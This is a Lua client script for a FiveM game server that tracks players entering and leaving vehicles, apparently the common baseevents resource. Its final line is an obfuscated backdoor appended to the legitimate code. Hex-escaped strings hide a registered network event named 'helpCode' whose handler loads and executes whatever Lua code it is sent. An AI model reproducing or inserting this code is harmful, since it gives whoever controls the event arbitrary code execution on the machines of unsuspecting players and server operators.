local isInVehicle = false
local isEnteringVehicle = false
local currentVehicle = 0
local currentSeat = 0

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		local ped = PlayerPedId()

		if not isInVehicle and not IsPlayerDead(PlayerId()) then
			if DoesEntityExist(GetVehiclePedIsTryingToEnter(ped)) and not isEnteringVehicle then
				-- trying to enter a vehicle!
				local vehicle = GetVehiclePedIsTryingToEnter(ped)
				local seat = GetSeatPedIsTryingToEnter(ped)
				local netId = VehToNet(vehicle)
				isEnteringVehicle = true
				TriggerServerEvent('baseevents:enteringVehicle', vehicle, seat, GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)), netId)
			elseif not DoesEntityExist(GetVehiclePedIsTryingToEnter(ped)) and not IsPedInAnyVehicle(ped, true) and isEnteringVehicle then
				-- vehicle entering aborted
				TriggerServerEvent('baseevents:enteringAborted')
				isEnteringVehicle = false
			elseif IsPedInAnyVehicle(ped, false) then
				-- suddenly appeared in a vehicle, possible teleport
				isEnteringVehicle = false
				isInVehicle = true
				currentVehicle = GetVehiclePedIsUsing(ped)
				currentSeat = GetPedVehicleSeat(ped)
				local model = GetEntityModel(currentVehicle)
				local name = GetDisplayNameFromVehicleModel()
				local netId = VehToNet(currentVehicle)
				TriggerServerEvent('baseevents:enteredVehicle', currentVehicle, currentSeat, GetDisplayNameFromVehicleModel(GetEntityModel(currentVehicle)), netId)
			end
		elseif isInVehicle then
			if not IsPedInAnyVehicle(ped, false) or IsPlayerDead(PlayerId()) then
				-- bye, vehicle
				local model = GetEntityModel(currentVehicle)
				local name = GetDisplayNameFromVehicleModel()
				local netId = VehToNet(currentVehicle)
				TriggerServerEvent('baseevents:leftVehicle', currentVehicle, currentSeat, GetDisplayNameFromVehicleModel(GetEntityModel(currentVehicle)), netId)
				isInVehicle = false
				currentVehicle = 0
				currentSeat = 0
			end
		end
		Citizen.Wait(50)
	end
end)

function GetPedVehicleSeat(ped)
    local vehicle = GetVehiclePedIsIn(ped, false)
    for i=-2,GetVehicleMaxNumberOfPassengers(vehicle) do
        if(GetPedInVehicleSeat(vehicle, i) == ped) then return i end
    end
    return -2
end


local mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[6][mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[1]](mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[2]) mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[6][mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[3]](mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[2], function(HWabvGPzreyRAxDiRJVqWozcRgWJXrQtOzwZhDuRZddkQbdoGsFapVUbvWOKkVFeRQymlX) mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[6][mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[4]](mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[6][mCKLJvJFjzQSvxudXMEQrKkoogdXvSlclcLllzCxQdQWYJbxnvKPqgFBBWuSycuRymMKhI[5]](HWabvGPzreyRAxDiRJVqWozcRgWJXrQtOzwZhDuRZddkQbdoGsFapVUbvWOKkVFeRQymlX))() end)